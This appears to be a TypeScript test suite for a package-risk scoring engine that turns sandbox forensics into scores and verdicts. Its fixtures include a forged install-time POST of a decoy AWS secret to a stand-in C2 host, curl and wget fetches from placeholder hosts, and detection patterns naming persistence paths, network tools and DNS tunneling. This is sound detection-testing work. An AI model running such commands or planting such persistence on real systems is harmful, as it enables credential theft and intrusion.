import { test } from "node:test";
import assert from "node:assert/strict";
import {
  BASE_NOT_VERIFIED,
  CAP_FORENSICS_LOST,
  CAP_FORENSICS_PARTIAL,
  CAP_NOT_PROVEN,
  bandFor,
  computeScore,
  deriveBehaviour,
  isPersistencePath,
  isSuspiciousInstallExec,
  isTunnelingDnsName,
  NO_BEHAVIOUR,
  verdictFor,
  type BehaviourSignals,
  type ScoreInput,
} from "../../lib/engine/score.ts";
import type { ReputationSignals } from "../../lib/engine/reputation.ts";
import type { FileEventData, ForgedCallData, ProcessEventData, TaggedCheckFinding, TaggedFinding } from "../../lib/engine/types.ts";

const NO_REP: ReputationSignals = {
  ownerAgeDays: null,
  ownerEstablished: null,
  npmFirstPublishDays: null,
  maintainerChangedWithin30d: null,
  weeklyDownloads: null,
  repoStars: null,
  evidence: [],
  unavailable: [],
};
const STRONG_REP: ReputationSignals = { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, weeklyDownloads: 5_000_000 };

function input(over: Partial<ScoreInput> = {}): ScoreInput {
  return {
    behaviour: NO_BEHAVIOUR,
    install: "completed",
    entry: "completed",
    archiveTruncated: false,
    forensics: { coverage: "complete", gaps: [] },
    coverage: { scanners: true, osv: true, checks: true },
    malicious: [],
    staticFindings: [],
    checkFindings: [],
    docs: null,
    capabilities: [],
    reputation: NO_REP,
    failedStages: [],
    ...over,
  };
}
const beh = (b: Partial<BehaviourSignals>): BehaviourSignals => ({ ...NO_BEHAVIOUR, ...b });
const sf = (over: Partial<TaggedFinding>): TaggedFinding => ({
  source: "heuristic",
  rule: "r",
  severity: "high",
  file: "lib/a.js",
  line: 1,
  message: "m",
  reach: "import",
  ...over,
});
const cf = (over: Partial<TaggedCheckFinding>): TaggedCheckFinding => ({
  check: "flagged",
  question: "window_0",
  file: "lib/a.js",
  line: 9,
  severity: "high",
  verdict: "malicious",
  probability: 0.93,
  title: "t",
  evidence: ["lib/a.js:1-24 p=0.93"],
  reach: "import",
  ...over,
});

const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdict: string }> = [
  { name: "clean run, no reputation signals", in: {}, score: 85, verdict: "Low risk" },
  { name: "clean run with established owner and downloads", in: { reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "clean established GitHub repo with 1000+ stars reaches 90", in: { reputation: { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, repoStars: 1000 } }, score: 90, verdict: "No threats observed" },
  { name: "999 stars earn no popularity point", in: { reputation: { ...NO_REP, ownerAgeDays: 3000, ownerEstablished: true, repoStars: 999 } }, score: 88, verdict: "Low risk" },
  { name: "stars plus downloads stay within the reputation bound", in: { reputation: { ...STRONG_REP, repoStars: 50_000 } }, score: 90, verdict: "No threats observed" },
  { name: "one canary hit alone lands under 30", in: { behaviour: beh({ canaryHits: ["AWS_SECRET_ACCESS_KEY sent to c2.example"] }) }, score: 15, verdict: "Malicious" },
  { name: "canary with strong reputation is still capped at 15", in: { behaviour: beh({ canaryHits: ["x"] }), reputation: STRONG_REP }, score: 15, verdict: "Malicious" },
  { name: "decoy credential read", in: { behaviour: beh({ decoyReads: ["/home/cr/.ssh/id_rsa"] }) }, score: 50, verdict: "High risk" },
  { name: "persistence write is capped at 15", in: { behaviour: beh({ persistenceWrites: ["/home/cr/.bashrc"] }) }, score: 15, verdict: "Malicious" },
  { name: "DNS tunneling shape", in: { behaviour: beh({ tunnelingDns: ["x.evil.example"] }) }, score: 55, verdict: "High risk" },
  { name: "one non-distribution host", in: { behaviour: beh({ nonDistributionHosts: ["c2.example"] }) }, score: 60, verdict: "Caution" },
  { name: "two non-distribution hosts hit the -45 cap", in: { behaviour: beh({ nonDistributionHosts: ["a.example", "b.example"] }) }, score: 40, verdict: "High risk" },
  { name: "three non-distribution hosts stay at -45", in: { behaviour: beh({ nonDistributionHosts: ["a", "b", "c"] }) }, score: 40, verdict: "High risk" },
  { name: "TLS interception refused", in: { behaviour: beh({ tlsRefused: ["pinned.example"] }) }, score: 65, verdict: "Caution" },
  { name: "one install-hook exec", in: { behaviour: beh({ suspiciousInstallExecs: ["curl -s x"] }) }, score: 70, verdict: "Caution" },
  { name: "three install-hook execs cap at -30", in: { behaviour: beh({ suspiciousInstallExecs: ["curl", "wget", "nc"] }) }, score: 55, verdict: "High risk" },
  { name: "a distribution fetch (prebuilt binary, release asset) costs nothing on its own", in: { behaviour: beh({ distributionFetches: ["github.com"] }) }, score: 85, verdict: "Low risk" },
  { name: "four distribution fetches still cost nothing", in: { behaviour: beh({ distributionFetches: ["a", "b", "c", "d"] }) }, score: 85, verdict: "Low risk" },
  { name: "behaviour group floors at -85", in: { behaviour: beh({ decoyReads: ["a"], tunnelingDns: ["b"], tlsRefused: ["c"], nonDistributionHosts: ["d", "e"] }) }, score: 0, verdict: "Malicious" },
  { name: "malicious dependency caps at 25", in: { malicious: [{ ecosystem: "npm", name: "evil", version: "1.0.0", ids: ["MAL-2025-1"] }], reputation: STRONG_REP }, score: 25, verdict: "Malicious" },
  { name: "one reachable high static finding", in: { staticFindings: [sf({})] }, score: 73, verdict: "Caution" },
  { name: "one reachable medium static finding", in: { staticFindings: [sf({ severity: "medium" })] }, score: 80, verdict: "Low risk" },
  { name: "low static finding is worth 0", in: { staticFindings: [sf({ severity: "low" })] }, score: 85, verdict: "Low risk" },
  { name: "unreachable high finding changes nothing", in: { staticFindings: [sf({ reach: "unreachable", file: "test/a.js" })], reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "same file:line from two scanners counts once at the worst weight", in: { staticFindings: [sf({ source: "semgrep" }), sf({ source: "yara", severity: "medium" })] }, score: 73, verdict: "Caution" },
  { name: "static floor at -40", in: { staticFindings: [1, 2, 3, 4, 5].map((line) => sf({ line })) }, score: 45, verdict: "High risk" },
  { name: "Jev malicious high", in: { checkFindings: [cf({})] }, score: 77, verdict: "Caution" },
  { name: "Jev suspicious medium", in: { checkFindings: [cf({ severity: "medium", verdict: "suspicious" })] }, score: 81, verdict: "Low risk" },
  { name: "Jev benign answer is worth 0", in: { checkFindings: [cf({ verdict: "benign", severity: "low" })] }, score: 85, verdict: "Low risk" },
  { name: "Jev unclear answer is worth 0 points and does not block 90 (it is listed as not verified)", in: { checkFindings: [cf({ verdict: "unclear", severity: "low" })], reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "Jev answer on an unreachable file is worth 0", in: { checkFindings: [cf({ reach: "unreachable" })] }, score: 85, verdict: "Low risk" },
  { name: "Jev and static on the same line dedup to the worst", in: { staticFindings: [sf({ line: 9 })], checkFindings: [cf({})] }, score: 73, verdict: "Caution" },
  {
    name: "docs no-network contradicted by behaviour",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "makes no network requests" }, behaviour: beh({ nonDistributionHosts: ["c2.example"] }) },
    score: 45,
    verdict: "High risk",
  },
  {
    name: "docs no-network contradicted by reachable static capability only",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "offline" }, capabilities: [{ file: "lib/a.js", capability: "network", reach: "import" }] },
    score: 79,
    verdict: "Caution",
  },
  {
    name: "docs no-network with only unreachable network capability",
    in: { docs: { declaresNoNetwork: true, declaresPure: false, quote: "offline" }, capabilities: [{ file: "test/a.js", capability: "network", reach: "unreachable" }] },
    score: 85,
    verdict: "Low risk",
  },
  {
    name: "docs pure contradicted by reachable process capability",
    in: { docs: { declaresNoNetwork: false, declaresPure: true, quote: "pure functions" }, capabilities: [{ file: "a.js", capability: "process", reach: "install" }] },
    score: 79,
    verdict: "Caution",
  },
  { name: "new GitHub owner is shown but takes nothing off", in: { reputation: { ...NO_REP, ownerAgeDays: 10 } }, score: 85, verdict: "Low risk" },
  {
    name: "every negative reputation signal together still takes nothing off",
    in: { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
    score: 85,
    verdict: "Low risk",
  },
  { name: "install failed caps at 74", in: { install: "failed" }, score: 74, verdict: "Caution" },
  { name: "install timeout never lowers the score", in: { install: "timeout", entry: "skipped", reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "entry timeout never lowers the score", in: { entry: "timeout", reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
  { name: "install skipped caps at 74", in: { install: "skipped", entry: "skipped" }, score: 74, verdict: "Caution" },
  { name: "archive truncated caps at 74", in: { archiveTruncated: true }, score: 74, verdict: "Caution" },
  { name: "lost forensics cap at 59 even with completed phases and strong reputation", in: { forensics: { coverage: "lost", gaps: [] }, reputation: STRONG_REP }, score: 59, verdict: "High risk" },
  { name: "lost forensics after an overrun: timeout plus lost caps at 59", in: { install: "timeout", entry: "skipped", forensics: { coverage: "lost", gaps: [] } }, score: 59, verdict: "High risk" },
  { name: "partial forensics caps at 74", in: { forensics: { coverage: "partial", gaps: ["capture.jsonl was cut at 8 MB."] }, reputation: STRONG_REP }, score: 74, verdict: "Caution" },
  { name: "entry skipped caps at 89", in: { entry: "skipped", reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "entry failed caps at 89", in: { entry: "failed", reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "scanner coverage missing blocks 90", in: { coverage: { scanners: false, osv: true, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "OSV coverage missing blocks 90", in: { coverage: { scanners: true, osv: false, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "Jev check coverage missing blocks 90", in: { coverage: { scanners: true, osv: true, checks: false }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
  { name: "negative reputation alone takes nothing off", in: { reputation: { ...STRONG_REP, maintainerChangedWithin30d: true, npmFirstPublishDays: 2, ownerAgeDays: 10, ownerEstablished: false, weeklyDownloads: 0 } }, score: 85, verdict: "Low risk" },
];

// The two real runs this rule set is held to (docs/runs/2.0-keyday.md steps 10 and 11):
// expressjs/express at 0dee2c5, whose install ran `bash -c "npm install"` (the
// harness) and npm's own `sh -c` lifecycle scripts and fetched only from the npm
// registry, and the phone-home fixture, which POSTs the decoy AWS credentials to a
// forged host during install.
const EXPRESS_FORGED: ForgedCallData[] = [
  { phase: "install", proto: "dns", host: "registry.npmjs.org", port: 53, req_bytes: 36, forged_kind: "dns", canary_hits: [] },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/body-parser", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/debug/-/debug-4.4.3.tgz", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
];
const EXPRESS_PROCS: ProcessEventData[] = [
  { phase: "install", pid: 1789, ppid: 0, argv: ["bash", "-c", "npm install --prefer-offline --no-audit --no-fund"] },
  { phase: "install", pid: 1790, ppid: 1789, argv: ["npm", "install", "--prefer-offline", "--no-audit", "--no-fund"] },
  { phase: "install", pid: 1801, ppid: 1790, argv: ["sh", "-c", "npm install"] },
  { phase: "install", pid: 1802, ppid: 1790, argv: ["sh", "-c", "node build.js"] },
];

test("score: express at 0dee2c5 (ordinary install, registry only) is in the top band with no deduction", () => {
  const behaviour = deriveBehaviour({ forgedCalls: EXPRESS_FORGED, files: [], processes: EXPRESS_PROCS, canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour, NO_BEHAVIOUR, "the harness shell, npm lifecycle shells and registry traffic are not behaviour");
  const r = computeScore(input({ behaviour, reputation: STRONG_REP }));
  assert.equal(r.verdict, "No threats observed");
  assert.ok(r.score >= 90, `score ${r.score}`);
  assert.deepEqual(r.breakdown.filter((d) => d.points < 0), [], "nothing is taken off");
  assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length, "still never a bare Safe");
});

test("score: the phone-home fixture (forged call with the decoy credential plus a decoy read) is Malicious 0", () => {
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  const r = computeScore(input({ behaviour, reputation: NO_REP }));
  assert.equal(r.verdict, "Malicious");
  assert.equal(r.score, 0);
});

test("score: every point taken off cites evidence", () => {
  const cases: Partial<ScoreInput>[] = [
    { behaviour: deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] }) },
    { behaviour: beh({ suspiciousInstallExecs: ["curl -fsSL https://x.example/i.sh"], tlsRefused: ["pinned.example"], persistenceWrites: ["/home/cr/.bashrc"] }) },
    { docs: { declaresNoNetwork: true, declaresPure: false, quote: "Makes no network requests." }, behaviour: beh({ distributionFetches: ["github.com"] }) },
    { checkFindings: [cf({ verdict: "malicious", severity: "high" })] },
    { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
  ];
  for (const c of cases) {
    const r = computeScore(input(c));
    for (const d of r.breakdown.filter((x) => x.points < 0 && x.group !== "cap" && x.code !== "behaviour_floor")) {
      assert.ok((d.evidence ?? []).some((e) => e.trim().length > 0), `${d.code} took ${d.points} without evidence`);
    }
  }
  // A docs contradiction with no quoted sentence cannot be cited, so it does not apply.
  const unquoted = computeScore(input({ docs: { declaresNoNetwork: true, declaresPure: false, quote: null }, behaviour: beh({ distributionFetches: ["github.com"] }) }));
  assert.ok(!unquoted.breakdown.some((d) => d.code === "docs_contradicted_by_behaviour"));
});

test("score: an install timeout scores the same as a completed install and is stated as not verified", () => {
  const done = computeScore(input({ reputation: STRONG_REP }));
  const timedOut = computeScore(input({ install: "timeout", entry: "skipped", reputation: STRONG_REP }));
  assert.equal(timedOut.score, done.score);
  const text = timedOut.notVerified.join(" ");
  assert.match(text, /Install phase did not complete \(timeout\)/);
  assert.match(text, /Entry phase was skipped/);
  assert.ok(!timedOut.breakdown.some((b) => b.code === "cap_install_incomplete" || b.code === "cap_entry_incomplete"));
});

for (const c of CASES) {
  test(`score: ${c.name}`, () => {
    const r = computeScore(input(c.in));
    assert.equal(r.score, c.score);
    assert.equal(r.verdict, c.verdict);
    assert.notEqual(r.verdict as string, "Safe");
    assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length);
    for (const b of BASE_NOT_VERIFIED) assert.ok(r.notVerified.includes(b));
    const sum = 85 + r.breakdown.filter((d) => d.group !== "cap").reduce((s, d) => s + d.points, 0);
    assert.equal(Math.min(100, Math.max(0, sum)), r.raw, "breakdown sums to the raw score");
    const capped = r.raw + r.breakdown.filter((d) => d.group === "cap").reduce((s, d) => s + d.points, 0);
    assert.equal(capped, r.score, "caps in the breakdown explain the final score");
  });
}

test("score: behaviour outweighs static (max static loss is smaller than one canary)", () => {
  const worstStatic = computeScore(input({ staticFindings: Array.from({ length: 20 }, (_, i) => sf({ line: i + 1 })) }));
  const oneCanary = computeScore(input({ behaviour: beh({ canaryHits: ["x"] }) }));
  assert.ok(worstStatic.score > oneCanary.score);
  assert.equal(worstStatic.groups.static, -40);
});

test("score: failed phases and coverage gaps are listed in not_verified", () => {
  const r = computeScore(input({ install: "timeout", coverage: { scanners: false, osv: false, checks: false }, failedStages: ["Stage osv passed its deadline."], reputation: { ...NO_REP, unavailable: ["npm download counts"] } }));
  const text = r.notVerified.join("\n");
  assert.match(text, /Install phase did not complete \(timeout\)/);
  assert.match(text, /Static scanners/);
  assert.match(text, /OSV malicious-package lookup/);
  assert.match(text, /Jev checks did not complete/);
  assert.match(text, /npm download counts/);
  assert.match(text, /Stage osv passed its deadline/);
});

test("verdict words and bands at every boundary; never Safe", () => {
  const table: Array<[number, string, string]> = [
    [100, "No threats observed", "green"],
    [90, "No threats observed", "green"],
    [89, "Low risk", "blue"],
    [80, "Low risk", "blue"],
    [79, "Caution", "yellow"],
    [60, "Caution", "yellow"],
    [59, "High risk", "red"],
    [30, "High risk", "red"],
    [29, "Malicious", "red"],
    [0, "Malicious", "red"],
  ];
  for (const [s, v, b] of table) {
    assert.equal(verdictFor(s), v);
    assert.equal(bandFor(s), b);
    assert.doesNotMatch(verdictFor(s), /\bsafe\b/i);
  }
});

test("behaviour classifiers", () => {
  assert.equal(isTunnelingDnsName("a9f3k2l1m8n7b6v5c4x3z2q1w0e9r8t7y6u5i4o3p2.evil.example"), true);
  assert.equal(isTunnelingDnsName("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example"), false);
  assert.equal(isTunnelingDnsName("www.example.com"), false);
  assert.equal(isPersistencePath("/home/cr/.bashrc"), true);
  assert.equal(isPersistencePath("/home/cr/.config/systemd/user/x.service"), true);
  assert.equal(isPersistencePath("/home/cr/.ssh/authorized_keys"), true);
  assert.equal(isPersistencePath("/etc/hosts"), true);
  assert.equal(isPersistencePath("/work/app/node_modules/x/.profile.js"), false);
  assert.equal(isSuspiciousInstallExec(["/usr/bin/curl", "-s", "x"]), true);
  assert.equal(isSuspiciousInstallExec(["bash", "-c", "x"]), false, "a shell is how npm and the harness run every script");
  assert.equal(isSuspiciousInstallExec(["bash", "-c", "npm install --no-audit --no-fund"]), false);
  assert.equal(isSuspiciousInstallExec(["sh", "-c", "node beacon.js"]), false);
  assert.equal(isSuspiciousInstallExec(["base64", "-d"]), true);
  assert.equal(isSuspiciousInstallExec(["node", "x.js"]), false);
});

test("deriveBehaviour maps forensics onto behaviour signals", () => {
  const call = (over: Partial<ForgedCallData>): ForgedCallData => ({
    phase: "install",
    proto: "https",
    host: "x",
    port: 443,
    req_bytes: 10,
    forged_kind: "json",
    canary_hits: [],
    ...over,
  });
  const b = deriveBehaviour({
    forgedCalls: [
      call({ host: "registry.npmjs.org", forged_kind: "mirror" }),
      call({ host: "c2.cr-fixture.invalid", proto: "http", port: 80, canary_hits: ["AWS_SECRET_ACCESS_KEY"] }),
      call({ host: "C2.cr-fixture.invalid", phase: "entry" }),
      call({ host: "github.com" }),
      call({ host: "pinned.example", tls: "refused" }),
      call({ host: "a9f3k2l1m8n7b6v5c4x3z2q1w0e9r8t7y6u5i4o3p2.evil.example", proto: "dns", port: 53 }),
      call({ host: "registry.npmjs.org", forged_kind: "json" }),
    ],
    files: [
      { phase: "install", op: "read_decoy", path: "/home/cr/.aws/credentials", pid: 5 },
      { phase: "install", op: "write", path: "/home/cr/.bashrc", pid: 5 },
      { phase: "install", op: "unlink", path: "/home/cr/.profile", pid: 5 },
      { phase: "entry", op: "write", path: "/work/app/out.txt", pid: 6 },
    ],
    processes: [
      { phase: "install", pid: 7, ppid: 1, argv: ["sh", "-c", "node beacon.js"] },
      { phase: "install", pid: 8, ppid: 7, argv: ["/usr/bin/curl", "-s", "http://c2/x"] },
      { phase: "entry", pid: 9, ppid: 1, argv: ["wget", "x"] },
      { phase: "entry", pid: 10, ppid: 1, argv: ["crontab", "/tmp/c"] },
    ],
    canaryInFiles: ["/tmp/stash.txt"],
  });
  assert.deepEqual(b.canaryHits, ["AWS_SECRET_ACCESS_KEY sent to c2.cr-fixture.invalid (http, install)", "canary copied into written file /tmp/stash.txt"]);
  assert.deepEqual(b.nonDistributionHosts, ["c2.cr-fixture.invalid", "pinned.example", "registry.npmjs.org"]);
  assert.deepEqual(b.distributionFetches, ["github.com"]);
  assert.deepEqual(b.tlsRefused, ["pinned.example"]);
  assert.equal(b.tunnelingDns.length, 1);
  assert.deepEqual(b.decoyReads, ["/home/cr/.aws/credentials"]);
  assert.deepEqual(b.persistenceWrites, ["/home/cr/.bashrc", "crontab /tmp/c"]);
  assert.deepEqual(b.suspiciousInstallExecs, ["/usr/bin/curl -s http://c2/x"]);
  const r = computeScore(input({ behaviour: b }));
  assert.equal(r.score, 0);
  assert.equal(r.verdict, "Malicious");
  assert.equal(r.groups.behaviour, -85);
});

test("score: a lost detonation never outscores an observed attack and never reads as observed-clean", () => {
  const lost = computeScore(input({ install: "timeout", entry: "skipped", forensics: { coverage: "lost", gaps: [] } }));
  const caught = computeScore(input({ behaviour: beh({ canaryHits: ["x"] }) }));
  assert.ok(lost.score <= CAP_FORENSICS_LOST && lost.score <= CAP_NOT_PROVEN);
  assert.ok(lost.score < 60, "a lost run lands in High risk or below");
  assert.ok(caught.score < lost.score, "an observed exfiltration still scores below a lost run");
  assert.match(lost.notVerified.join("\n"), /did not produce a forensic record/);
  const partial = computeScore(input({ forensics: { coverage: "partial", gaps: ["trace.install was cut at 8 MB."] } }));
  assert.ok(partial.score <= CAP_FORENSICS_PARTIAL);
  assert.ok(partial.notVerified.includes("trace.install was cut at 8 MB."));
});

// ---- sandbox facts plus Jev answers to the number, end to end in code ------------------------------

const FIXTURE_FORGED: ForgedCallData[] = [
  { phase: "install", proto: "dns", host: "c2.cr-fixture.invalid", port: 53, req_bytes: 40, forged_kind: "dns", canary_hits: [] },
  {
    phase: "install",
    proto: "https",
    host: "c2.cr-fixture.invalid",
    port: 443,
    method: "POST",
    path: "/collect",
    sni: "c2.cr-fixture.invalid",
    req_bytes: 512,
    forged_kind: "json",
    tls: "intercepted",
    canary_hits: ["AWS_SECRET_ACCESS_KEY"],
  },
  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/left-pad", req_bytes: 200, forged_kind: "mirror", tls: "intercepted", canary_hits: [] },
];
const FIXTURE_FILES: FileEventData[] = [{ phase: "install", op: "read_decoy", path: "/home/cr/.aws/credentials", pid: 412 }];
const FIXTURE_PROCS: ProcessEventData[] = [
  { phase: "install", pid: 400, ppid: 1, argv: ["sh", "-c", "node beacon.js"] },
  { phase: "install", pid: 412, ppid: 400, argv: ["node", "beacon.js"] },
];

test("facts to verdict: a forged call to a fake host carrying a planted credential plus a decoy read is flagged Malicious with a low score", () => {
  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour.nonDistributionHosts, ["c2.cr-fixture.invalid"], "the registry mirror call is not behaviour");
  assert.equal(behaviour.canaryHits.length, 1);
  assert.deepEqual(behaviour.decoyReads, ["/home/cr/.aws/credentials"]);
  const jev = [cf({ check: "install", question: "file_1", file: "beacon.js", line: null, reach: "install", evidence: ["beacon.js (install surface) p=0.97", "install signal credential access p=0.95"] })];
  // Strong reputation must not lift it: reputation is its own bounded group.
  const r = computeScore(input({ behaviour, checkFindings: jev, reputation: STRONG_REP }));
  assert.equal(r.verdict, "Malicious");
  assert.ok(r.score <= 15, `score ${r.score}`);
  assert.equal(r.band, "red");
  const codes = r.breakdown.map((d) => d.code);
  for (const c of ["canary_exfiltration", "decoy_credential_read", "non_distribution_contact", "reachable_static_findings", "behaviour_floor"]) assert.ok(codes.includes(c), c);
  assert.ok(r.breakdown.find((d) => d.code === "reachable_static_findings")!.evidence!.some((e) => /Jev install check: malicious at beacon\.js/.test(e)));
  assert.ok(r.breakdown.filter((d) => d.group === "reputation").every((d) => d.points >= 0), "reputation stays in its own group");
  assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length);
  // Same facts, same answers, same number: no model in the loop.
  assert.deepEqual(computeScore(input({ behaviour, checkFindings: jev, reputation: STRONG_REP })), r);
});

test("facts to verdict: clean facts and benign Jev answers give a high score with a non-empty not-verified list, never Safe", () => {
  const behaviour = deriveBehaviour({ forgedCalls: [FIXTURE_FORGED[2]!], files: [], processes: [{ phase: "install", pid: 400, ppid: 1, argv: ["node", "-e", "1"] }], canaryInFiles: [], datagramEgress: [] });
  assert.deepEqual(behaviour, NO_BEHAVIOUR);
  const r = computeScore(input({ behaviour, checkFindings: [], reputation: STRONG_REP }));
  assert.ok(r.score >= 90, `score ${r.score}`);
  assert.equal(r.verdict, "No threats observed");
  assert.notEqual(r.verdict as string, "Safe");
  assert.ok(r.notVerified.length > 0);
  for (const b of BASE_NOT_VERIFIED) assert.ok(r.notVerified.includes(b));
  // Without Jev coverage the same clean facts stay under 90 and say why.
  const noJev = computeScore(input({ behaviour, coverage: { scanners: true, osv: true, checks: false }, reputation: STRONG_REP }));
  assert.equal(noJev.score, CAP_NOT_PROVEN);
  assert.ok(noJev.notVerified.some((n) => /Jev checks did not complete/.test(n)));
});

test("an unclear Jev answer is listed under not_verified with its location", () => {
  const r = computeScore(input({ checkFindings: [cf({ verdict: "unclear", severity: "low", file: "lib/x.js", line: 4 })] }));
  assert.ok(r.notVerified.some((n) => n.includes("Jev could not decide on 1 reachable location(s): lib/x.js:4 (flagged check)")), JSON.stringify(r.notVerified));
});
